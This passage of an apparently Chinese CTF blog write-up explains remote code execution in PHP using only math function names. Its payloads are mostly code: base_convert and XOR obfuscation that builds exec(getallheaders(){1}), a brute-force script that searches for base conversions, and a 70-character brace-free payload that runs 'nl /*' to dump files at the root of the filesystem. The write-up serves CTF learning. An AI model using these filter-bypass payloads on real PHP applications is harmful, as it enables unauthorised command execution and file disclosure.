+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//base_convert(696468,10,36) -&gt; exec</span><br><span class="hljs-comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="hljs-comment">//exec(getallheaders()&#123;1&#125;)</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="穷举进制转换"><a href="#穷举进制转换" class="headerlink" title="穷举进制转换"></a>穷举进制转换</h3><p>如果要得到flag字符串，10进制转36进制需要数字为727432,有6位，而通过脚本穷举+正则匹配筛选可以发现32进制转22进制时，只需要4位数字就可以得到flag</p>
+<p>脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$tmp</span>)-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-variable">$num</span>)<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">11</span>+<span class="hljs-variable">$num</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">10</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$res</span>.= <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>*<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;&#125;\n/&#x27;</span>,<span class="hljs-variable">$res</span>,<span class="hljs-variable">$mc</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg" srcset="/img/loading.gif" lazyload alt="image-20220809211543165"></p>
+<blockquote>
+<p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p>
+</blockquote>
+<h2 id="0x03-一些尝试"><a href="#0x03-一些尝试" class="headerlink" title="0x03 一些尝试"></a>0x03 一些尝试</h2><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>上面的payload几乎都使用了花括号来访问数组，如果题目过滤了花括号，那么是否可以在保证长度尽可能小的情况下,构造无花括号payload</p>
+<blockquote>
+<p>PHP7.4不再能够使用花括号来访问<a target="_blank" rel="noopener" href="https://www.yuanmaluntan.com/tags-11630.html">数组</a>或者字符串的偏移.需要将{}修改成[] （本题环境为7.3.9）</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg" srcset="/img/loading.gif" lazyload alt="4"></p>
+<h3 id="无花括号payload"><a href="#无花括号payload" class="headerlink" title="无花括号payload"></a>无花括号payload</h3><p>由于传入的是字符串，反引号不能被识别为系统命令执行，因此使用名称较短的exec函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>但是这样就不能外部传入命令来节省payload，因此要求执行的命令足够短，这里使用nl命令</p>
+<p>linux下执行<code>nl /*</code>扫描根目录，会打印根目录下所有文件，不会目录向下递归</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg" srcset="/img/loading.gif" lazyload alt="6"></p>
+<blockquote>
+<p><code>nl [参数] [文件]</code></p>
+<p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">aff   rad2deg sin <span class="hljs-comment">//`nl</span><br><span class="hljs-number">16</span>   exp tan   <span class="hljs-comment">// /</span><br><span class="hljs-number">9</span>f   cos pi  <span class="hljs-comment">//*`</span><br>  <br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">2815</span>)^rad2deg^sin).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>)^exp^tan).(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">159</span>)^cos^pi) <span class="hljs-comment">//`nl /*`</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca   abs log <span class="hljs-comment">//nl</span><br><span class="hljs-number">164</span>   exp tan <span class="hljs-comment">// /*</span><br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).(<span class="hljs-title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="hljs-comment">//nl /*</span><br></code></pre></td></tr></table></figure>
+
+<p>用上面的穷举脚本找出最适合的进制转换exec</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;34 23 22950&quot;</span>&#125;<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>) <span class="hljs-comment">//exec</span><br></code></pre></td></tr></table></figure>
+
+<p>无花括号payload</p>
+<p>长度:70</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)((<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)^exp^tan))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>本地php7.4以上也能成功执行(但是php8以后有个fatal error 不能使用未定义常量，直接用函数名异或的时候会识别成常量)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p>不过这边尝试了下带花括号的，似乎也能成功，花括号只在php8以后才被定义为<strong>Fatal error</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg" srcset="/img/loading.gif" lazyload alt="12"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+        <a href="/tags/php/">#php</a>
+      
+        <a href="/tags/rce/">#rce</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php利用math函数rce相关思考与理解</div>
+      <div>http://sloth31.github.io/2022/01/20/php利用math函数rce相关思考与理解/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sloth</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月20日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/" title="M1 mac下搭建使用qt creator + QMYSQL驱动">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">M1 mac下搭建使用qt creator + QMYSQL驱动</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
